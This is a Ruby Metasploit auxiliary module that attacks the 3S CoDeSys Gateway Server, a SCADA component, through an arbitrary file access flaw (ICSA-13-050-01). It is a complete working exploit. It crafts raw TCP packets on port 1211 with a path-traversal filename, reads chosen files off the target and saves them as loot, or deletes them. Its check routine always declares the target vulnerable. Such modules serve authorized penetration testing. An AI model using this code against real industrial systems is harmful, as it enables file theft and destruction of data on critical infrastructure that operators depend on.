##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
				'Name' => 'SCADA 3S CoDeSys Gateway Server Arbitrary File Access',
				'Description' => %q{
					This module exploits accesses (read and delete)  an arbitrary file within the SCADA system
					},
				'Author' =>
					[
						'Enrique Sanchez <esanchez@accuvant.com>'
					],
				'License' => 'MSF_LICENSE',
				'References' =>
					[
						['ICSA-13-050-01', '02-19-2013']
					],
				'Platform' => 'win',
				'DisclosureDate' => 'Feb 19 2013',
				'Actions' =>
					[
						['READ'],
						['DELETE']
					],
				'DefaultAction' => 'READ',
				'Targets' =>
					[
						['Windows Universal S3 CoDeSyS < 2.3.9.27', { }]
					],
					'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(1211),
				OptString.new('FILEPATH', [false, 'Path to file']),
				OptString.new('FILENAME', [true, 'Filename']),
				OptString.new('ACTION', [true, 'READ or DELETE', 'READ'])
			], self.class
		)
	end

	def check
		return Exploit::CheckCode::Vulnerable
	end

	def read_file(filepath, filename)
		magic_code = "\xdd\xdd"
		remote_file = nil

		if filepath == nil
			filepath = ""
		end

		pkt = magic_code << "AAAAAAAAAAAA" << [0x100].pack("L")
		#print_debug("pkt.size is #{pkt.size}")
		opcode = [4].pack("L")

		file = "..\\..\\" << filepath << filename << "\x00"
		#print_debug("File to read is #{file}")
		tmp_pkt = opcode << file
		pkt << tmp_pkt << "X" * (0x100 - tmp_pkt.size)
		connect
		sock.put(pkt)
		begin
			::Timeout.timeout( 5 ) do
				remote_file = sock.read(2000)
			end
		rescue ::Timeout::Error
		end

		if remote_file != nil
			# trim 14 chars since that is part of the SCADA response, this allows to retrieve valid binaries
			f = store_loot(filename, "text/plain", nil, remote_file[14..-1], filename, "S3 CoDeSyS file extracted")
			print_good("Saved remote file: #{f.to_s}")
		end
	end

	def delete_file(filepath, filename)
		magic_code = "\xdd\xdd"
		remote_file = nil

		if filepath == nil
			filepath = ""
		end

		pkt = magic_code << "AAAAAAAAAAAA" << [0x100].pack("L")
		opcode = [0x0D].pack("L")

		file = "..\\..\\" << filepath << filename << "\x00"
		#print_debug("File to delete is #{file}")
		tmp_pkt = opcode << file
		pkt << tmp_pkt << "X" * (0x100 - tmp_pkt.size)
		connect
		sock.put(pkt)
		begin
			::Timeout.timeout( 5 ) do
				remote_packet = sock.read(2000)
			end
		rescue ::Timeout::Error
		end
	end

	def run
		print_status("Attempting to communicate with SCADA system #{rhost} on port #{rport}")
		case datastore['ACTION']
		when 'READ'
			print_status("Attempting to read file #{datastore['FILEPATH']}#{datastore['FILENAME']}")
			read_file(datastore['FILEPATH'], datastore['FILENAME'])
		when 'DELETE'
			print_status("Attempting to delete file #{datastore['FILENAME']}")
			delete_file(datastore['FILEPATH'], datastore['FILENAME'])
		end
	end
end
